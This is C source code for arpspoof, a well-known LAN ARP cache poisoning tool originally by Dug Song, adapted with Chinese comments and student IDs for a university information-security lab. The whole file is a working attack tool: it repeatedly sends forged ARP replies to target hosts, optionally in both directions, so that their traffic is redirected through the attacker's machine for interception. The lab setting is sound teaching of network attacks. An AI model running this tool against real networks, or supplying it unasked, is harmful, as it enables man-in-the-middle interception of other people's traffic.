/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 *
 * Improved 2011 by Stefan Tomanek <stefa@pico.ruhr.de>
 */

/*
 * 信息安全导论arpspoofing实验
 * PB15111662 李双利
 */

//#include "config.h"

#include <sys/types.h>              //基本系统数据类型
#include <sys/param.h>
#include <sys/socket.h>             //与套接字相关的函数声明和结构体定义

#ifdef BSD
#include <sys/sysctl.h>             //sysctl函数头文件
#include <net/if_dl.h>
#include <net/route.h>
#ifdef __FreeBSD__  /* XXX */
#define ether_addr_octet octet      //网络字节地址定义
#endif
#else /* !BSD */
#include <sys/ioctl.h>          //I/O控制操作相关的函数声明，如ioctl()
#ifndef __linux__
#include <sys/sockio.h>
#endif
#endif /* !BSD */
#include <net/if.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>             //端口宏定义

#include <netinet/if_ether.h>       //ether_arp的数据结构

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> /
#include <string.h>

//#include "config.h"

//#include <sys/types.h>
//#include <sys/param.h>
//#include <netinet/in.h>

//#include <stdio.h>
//#include <string.h>
#include <signal.h> 
#include <err.h>
#include <libnet.h> 
#include <pcap.h>   

#ifndef _ARP_H_
#define _ARP_H_

#include <net/ethernet.h>   //包括几个以太网的数据结构，ether_addr(mac帧结构),

/*声明了查找arp缓存表的函数*/
int arp_cache_lookup(in_addr_t ip, struct ether_addr *ether, const char* linf);

#endif

//#include "arp.h"
//#include "version.h"

#ifdef BSD      //BSD系统中的arp_cache_lookup函数实现
/*ip为查找IP值 */
int
arp_cache_lookup(in_addr_t ip, struct ether_addr *ether, const char* linf)
{
    int mib[6];
    size_t len;                 //长度
    char *buf, *next, *end;     //缓存、下一个、最后一个
    struct rt_msghdr *rtm;      //rt_msghdr结构
    struct sockaddr_inarp *sin; //sockaddr_in 是internet环境下套接字的地址形式
    struct sockaddr_dl *sdl;

    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_INET;           // IPv4网络协议的套接字类型
    mib[4] = NET_RT_FLAGS;
    mib[5] = RTF_LLINFO;

    /*sysctl函数设置失败，返回-1*/
    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0)
        return (-1);
    /*buf分配失败，返回-1*/
    if ((buf = (char *)malloc(len)) == NULL)
        return (-1);
    /*设置oldp参数为buf*/
    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
        free(buf);
        return (-1);
    }
    end = buf + len;        //设置end的指针位置
    /*next指针从buf到end开始遍历，步长为rtm->rtm_msglen */
    for (next = buf ; next < end ; next += rtm->rtm_msglen) {
        rtm = (struct rt_msghdr *)next;     //设置rtm、sin、sdl的指针值
        sin = (struct sockaddr_inarp *)(rtm + 1);
        sdl = (struct sockaddr_dl *)(sin + 1);
        /*如果s_addr和查找IP值相等且sdl_alen不为0*/
        if (sin->sin_addr.s_addr == ip && sdl->sdl_alen) {
            //将ether_addr_octet的所有值设置为LLADDR(sdl)
            memcpy(ether->ether_addr_octet, LLADDR(sdl),
                   ETHER_ADDR_LEN);
            free(buf);      //释放缓存空间
            return (0);
        }
    }
    free(buf);              //释放缓存空间

    return (-1);
}

#else /* !BSD */        //其他非BSD的系统的arp缓存查找函数

#ifndef ETHER_ADDR_LEN  /* XXX - Solaris */
#define ETHER_ADDR_LEN  6
#endif

int
arp_cache_lookup(in_addr_t ip, struct ether_addr *ether, const char* lif)
{
    int sock;
    struct arpreq ar;
    struct sockaddr_in *sin;

    memset((char *)&ar, 0, sizeof(ar));
#ifdef __linux__
    strncpy(ar.arp_dev, lif, strlen(lif));
#endif
    sin = (struct sockaddr_in *)&ar.arp_pa;
    sin->sin_family = AF_INET;
    sin->sin_addr.s_addr = ip;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        return (-1);
    }
    if (ioctl(sock, SIOCGARP, (caddr_t)&ar) == -1) {
        close(sock);
        return (-1);
    }
    close(sock);
    //设置ether_addr_octec的所有值为ar.arp_ha.sa_data
    memcpy(ether->ether_addr_octet, ar.arp_ha.sa_data, ETHER_ADDR_LEN);

    return (0);
}

#endif /* !BSD */

extern char *ether_ntoa(struct ether_addr *);

/*定义主机的结构，包括ip地址和MAC地址*/
struct host {
    in_addr_t ip;               
    struct ether_addr mac;
};

#define VERSION "version"

static libnet_t *l;
static struct host spoof = {0};         //欺骗性主机
static struct host *targets;            //目的主机
static char *intf;
static int poison_reverse;

static uint8_t *my_ha = NULL;
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";

static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void
usage(void)             //arpspoof使用说明函数，打印一句话
{
    fprintf(stderr, "Version: " VERSION "\n"
        "Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host\n");
    exit(1);
}

static int
arp_send(libnet_t *l, int op,
    u_int8_t *sha, in_addr_t spa,
    u_int8_t *tha, in_addr_t tpa,
    u_int8_t *me)
{
    int retval;

    if (!me) me = sha;
    /*libnet_autobuild_arp函数，功能为构造arp数据包 */
    libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
                 tha, (u_int8_t *)&tpa, l);
    /*libnet_build_ethernet函数，功能为构造一个以太网数据包*/
    libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
    //输出网络地址
    fprintf(stderr, "[PB15111662 ARPSpoofing Lab] %s ",
        ether_ntoa((struct ether_addr *)me));
    /*回显处理*/
    if (op == ARPOP_REQUEST) {
        fprintf(stderr, "[-------]%s 0806 42: arp who-has %s tell %s\n",
            ether_ntoa((struct ether_addr *)tha),
            libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
            libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
    }
    else {
        fprintf(stderr, "[-------]%s 0806 42: arp reply %s is-at ",
            ether_ntoa((struct ether_addr *)tha),
            libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
        fprintf(stderr, "%s\n",
            ether_ntoa((struct ether_addr *)sha));
    }
    retval = libnet_write(l);
    if (retval)
        fprintf(stderr, "%s", libnet_geterror(l));

    libnet_clear_packet(l);

    return retval;
}

#ifdef __linux__            //linux下的arp_force函数
static int
arp_force(in_addr_t dst)
{
    struct sockaddr_in sin;
    int i, fd;

    if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
        return (0);

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = dst;
    sin.sin_port = htons(67);

    i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));

    close(fd);

    return (i == 0);
}
#endif
/*arp_find函数，寻找arp表*/
static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
    int i = 0;

    do {
        if (arp_cache_lookup(ip, mac, intf) == 0)
            return (1);
#ifdef __linux__
        /* XXX - force the kernel to arp. feh. */
        arp_force(ip);
#else
        arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
#endif
        sleep(1);
    }
    /*在本机网络设备存在的条件下把包再发3遍,
    留个缓冲时间*/
    while (i++ < 3);

    return (0);
}
//寻找所有目标arp
static int arp_find_all() {
    struct host *target = targets;
    while(target->ip) {
        if (arp_find(target->ip, &target->mac)) {
            return 1;
        }
        target++;
    }

    return 0;
}

static void
cleanup(int sig)
{
    int fw = arp_find(spoof.ip, &spoof.mac);
    int bw = poison_reverse && targets[0].ip && arp_find_all();
    int i;
    int rounds = (cleanup_src_own*5 + cleanup_src_host*5);

    fprintf(stderr, "Cleaning up and re-arping targets...\n");
    for (i = 0; i < rounds; i++) {
        struct host *target = targets;
        while(target->ip) {
            uint8_t *src_ha = NULL;
            if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
                src_ha = my_ha;
            }
            if (fw) {
                arp_send(l, ARPOP_REPLY,
                     (u_int8_t *)&spoof.mac, spoof.ip,
                     (target->ip ? (u_int8_t *)&target->mac : brd_ha),
                     target->ip,
                     src_ha);
                /* we have to wait a moment before sending the next packet */
                sleep(1);
            }
            if (bw) {
                arp_send(l, ARPOP_REPLY,
                     (u_int8_t *)&target->mac, target->ip,
                     (u_int8_t *)&spoof.mac,
                     spoof.ip,
                     src_ha);
                sleep(1);
            }
            target++;
        }
    }

    exit(0);
}

int
main(int argc, char *argv[])
{
    extern char *optarg;
    extern int optind;
    char pcap_ebuf[PCAP_ERRBUF_SIZE];
    char libnet_ebuf[LIBNET_ERRBUF_SIZE];
    int c;
    int n_targets;
    char *cleanup_src = NULL;

    spoof.ip = 0;
    intf = NULL;
    poison_reverse = 0;
    n_targets = 0;

    /* allocate enough memory for target list */
    targets = calloc( argc+1, sizeof(struct host) );
    while ((c = getopt(argc, argv, "ri:t:c:h?V")) != -1) {
        switch (c) {
        case 'i':
            intf = optarg;
            break;
        // libnet_name2addr4是解析域名,然后把域名解析的结果形成ip地址返回到target_ip
        case 't':
            if ((targets[n_targets++].ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
                usage();
            break;
        case 'r':
            poison_reverse = 1;
            break;
        case 'c':
            cleanup_src = optarg;
            break;
        default:
            usage();
        }
    }
    argc -= optind;
    argv += optind;

    if (argc != 1)
        usage();

    if (poison_reverse && !n_targets) {
        errx(1, "Spoofing the reverse path (-r) is only available when specifying a target (-t).");
        usage();
    }

    if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
        /* only use our own hw address when cleaning up,
         * not jeopardizing any bridges on the way to our
         * target
         */
        cleanup_src_own = 1;
        cleanup_src_host = 0;
    } else if (strcmp(cleanup_src, "host")==0) {
        /* only use the target hw address when cleaning up;
         * this can screw up some bridges and scramble access
         * for our own host, however it resets the arp table
         * more reliably
         */
        cleanup_src_own = 0;
        cleanup_src_host = 1;
    } else if (strcmp(cleanup_src, "both")==0) {
        cleanup_src_own = 1;
        cleanup_src_host = 1;
    } else {
        errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
        usage();
    }

    if ((spoof.ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
        usage();

    if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
        errx(1, "%s", pcap_ebuf);

    if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
        errx(1, "%s", libnet_ebuf);

    struct host *target = targets;

    while(target->ip) {
        if (target->ip != 0 && !arp_find(target->ip, &target->mac))
            errx(1, "couldn't arp for host %s",
            libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
        target++;
    }

    if (poison_reverse) {
        if (!arp_find(spoof.ip, &spoof.mac)) {
            errx(1, "couldn't arp for spoof host %s",
                 libnet_addr2name4(spoof.ip, LIBNET_DONT_RESOLVE));
        }
    }

    if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
        errx(1, "Unable to determine own mac address");
    }
    //信号处理
    signal(SIGHUP, cleanup);
    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);
    printf("PB13206106,Luo Yongguan");

    for (;;) {
        struct host *target = targets;
        while(target->ip) {
            arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
                (target->ip ? (u_int8_t *)&target->mac : brd_ha),
                target->ip,
                my_ha);
            if (poison_reverse) {
                arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
            }
            target++;
        }

        sleep(2);
    }
    /* NOTREACHED */

    exit(0);
}